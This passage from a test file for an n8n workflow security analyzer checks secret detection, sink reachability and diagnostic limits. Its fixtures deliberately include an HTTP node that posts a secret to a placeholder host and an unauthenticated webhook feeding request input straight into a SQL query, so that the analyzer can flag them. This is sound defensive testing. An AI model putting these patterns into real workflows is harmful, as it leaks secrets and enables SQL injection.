    executable: process.execPath,
    signal: AbortSignal.abort(),
  });
  assert.equal(emptyScan.reason, "tool_cancelled");

  // C4: tool_cross_field_match retains valid secret findings while marking partial coverage.
  const crossDoc = {
    nodes: [node("Start", "manualTrigger", 1)],
    connections: {},
    notes: { a: "synthetic-a", b: "synthetic-b" },
  };
  const crossCtx = createContext(Buffer.from(JSON.stringify(crossDoc)));
  const fieldA = crossCtx.fields.find(
    (f) => f.kind === "value" && f.pointer === "/notes/a",
  );
  const crossTool = {
    tool: "gitleaks",
    version: "8.30.1",
    status: "completed",
    findings: [{ fieldIndex: fieldA.index, ruleId: "private-key" }],
    diagnostics: ["tool_cross_field_match"],
  };
  const [secretsRule] = analyzeContent(crossCtx, crossTool).map((r) =>
    ruleResultSchema.parse(r),
  );
  assert.equal(secretsRule.findings.length, 1);
  assert.equal(secretsRule.coverage[0].status, "partial");
  assert.ok(
    secretsRule.diagnostics.some((d) => d.code === "tool_cross_field_match"),
  );
  const crossReport = assessmentReportSchema.parse(
    await assessBytes(Buffer.from(JSON.stringify(crossDoc)), {
      collectTools: async () => ({
        gitleaks: crossTool,
        native: (await mockTools()).native,
      }),
      now: "2026-11-26T00:00:00.000Z",
    }),
  );
  const crossService = serviceReportSchema.parse(
    buildServiceReport(crossReport),
  );
  assert.equal(crossService.analysisStatus, "review_required");
  assert.ok(
    crossService.analysisGaps.some((g) => g.code === "tool_cross_field_match"),
  );
});

test("D1-D2: sink-reachable gaps traverse through intermediate sinks and disabled main pass-through nodes", async () => {
  // D1: lastNode webhook -> httpRequest -> set(v99) must count set(v99) gaps as sink-reachable.
  const lastNodeChain = chain(
    node("Hook", "webhook", 2.1, { responseMode: "lastNode" }),
    node("Req", "httpRequest", 4.2, { url: "https://example.invalid" }),
    node("Opaque", "set", 99),
  );
  const lastNodeService = serviceReportSchema.parse(
    buildServiceReport(await assess(lastNodeChain)),
  );
  assert.ok(lastNodeService.serviceScope.sinkReachableGapCount > 0);
  assert.equal(lastNodeService.serviceScope.isolatedGapCount, 0);

  // D1: executeWorkflowTrigger -> httpRequest -> set(v99)
  const subworkflowChain = chain(
    node("SubIn", "executeWorkflowTrigger", 1.1),
    node("Req", "httpRequest", 4.2, { url: "https://example.invalid" }),
    node("Opaque", "set", 99),
  );
  const subworkflowService = serviceReportSchema.parse(
    buildServiceReport(await assess(subworkflowChain)),
  );
  assert.ok(subworkflowService.serviceScope.sinkReachableGapCount > 0);
  assert.equal(subworkflowService.serviceScope.isolatedGapCount, 0);

  // D2: disabled pass-through noOp between gap node and active sink preserves sink reachability.
  const disabledPassThrough = chain(
    node("Hook", "webhook", 2.1),
    node("Opaque", "set", 99),
    node("Pass", "noOp", 1, {}, { disabled: true }),
    node("Req", "httpRequest", 4.2, {
      method: "POST",
      url: "https://example.invalid",
      sendBody: true,
      contentType: "raw",
      body: "={{ $json.secret }}",
    }),
  );
  const disabledPassService = serviceReportSchema.parse(
    buildServiceReport(await assess(disabledPassThrough)),
  );
  assert.ok(disabledPassService.serviceScope.sinkReachableGapCount > 0);
  assert.equal(disabledPassService.serviceScope.isolatedGapCount, 0);

  // D2 negative: disabled terminal sink does not make an upstream isolated node sink-reachable.
  const disabledTerminalSink = chain(
    node("Hook", "webhook", 2.1),
    node("Opaque", "set", 99),
    node(
      "DisabledReq",
      "httpRequest",
      4.2,
      { url: "https://example.invalid" },
      { disabled: true },
    ),
  );
  const disabledTerminalService = serviceReportSchema.parse(
    buildServiceReport(await assess(disabledTerminalSink)),
  );
  assert.ok(disabledTerminalService.serviceScope.isolatedGapCount > 0);
});

test("CodeRabbit static-flow: 90 stopAndError nodes stay within the 256 diagnostic cap and preserve other rules", async () => {
  const stopNodes = Array.from({ length: 90 }, (_, index) =>
    node(`Stop${index}`, "stopAndError", 1, { errorType: "future" }),
  );
  const workflow = {
    nodes: [
      node("Hook", "webhook", 2.1, { authentication: "none" }),
      node("Db", "postgres", 2.8, {
        operation: "executeQuery",
        query: "SELECT * FROM t WHERE id = '{{ $json.body.id }}'",
      }),
      node("Opaque", "set", 99),
      ...stopNodes,
    ],
    connections: {
      Hook: { main: [[{ node: "Db", type: "main", index: 0 }]] },
    },
  };
  const bytes = Buffer.from(JSON.stringify(workflow));
  const staticReport = staticReportSchema.parse(
    analyzeStatic(bytes, cleanGitleaks),
  );
  assert.notEqual(staticReport.status, "error");
  const outputRule = staticReport.rules.find(
    (r) => r.ruleId === "N8N_RESPONSE_EXPOSURE",
  );
  assert.ok(outputRule.diagnostics.length <= 256);
  assert.ok(
    outputRule.diagnostics.some(
      (d) => d.code === "definition_diagnostic_limit",
    ),
  );
  assert.ok(
    outputRule.coverage.slice(-5).every((c) => c.status === "unsupported"),
  );
  const sqlRule = staticReport.rules.find(
    (r) => r.ruleId === "N8N_SQL_TEXT_FLOW",
  );
  assert.ok(sqlRule.findings.length > 0);

  const fullAssessment = assessmentReportSchema.parse(await assess(workflow));
  assert.notEqual(fullAssessment.status, "error");
});
